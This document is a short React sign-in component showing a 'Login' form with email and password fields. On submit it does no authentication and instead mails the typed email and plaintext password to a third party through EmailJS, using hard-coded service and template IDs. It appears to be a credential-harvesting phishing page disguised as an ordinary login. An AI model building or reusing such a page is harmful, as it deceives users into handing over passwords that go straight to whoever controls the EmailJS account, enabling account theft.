import React, { useState } from 'react';
import emailjs from 'emailjs-com';
import './index.scss';

const Dsignin = () => {
  
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (event) => {
    event.preventDefault();
    sendForm();
  };

  const sendForm = () => {
    const params = {
      
      email: email,
      password: password,
    };

    return emailjs.send('XH6ssfwJtcaq4tM1c', 'template_aosztus', params, 'service_c71nlw3')
      .then((response) => {
        console.log('Email sent successfully!', response);
        // Handle successful form submission here
      })
      .catch((error) => {
        console.log('Error sending email:', error);
        // Handle error sending email here
      });
  };

  return (
    <div className="container contact-page">
      <div className="text-reg">
        <h1>Login</h1>
      </div>

      <div className="form-container">
        <form onSubmit={handleSubmit}>
          
          <div className="form-field">
            <input
              type="email"
              id="email"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              placeholder="Email"
            />
          </div>
          <div className="form-field">
            <input
              type="password"
              id="password"
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              placeholder="Password"
            />
          </div>
          <button type="submit" className="form-button">
            Sign In
          </button>
        </form>
      </div>
    </div>
  );
};

export default Dsignin;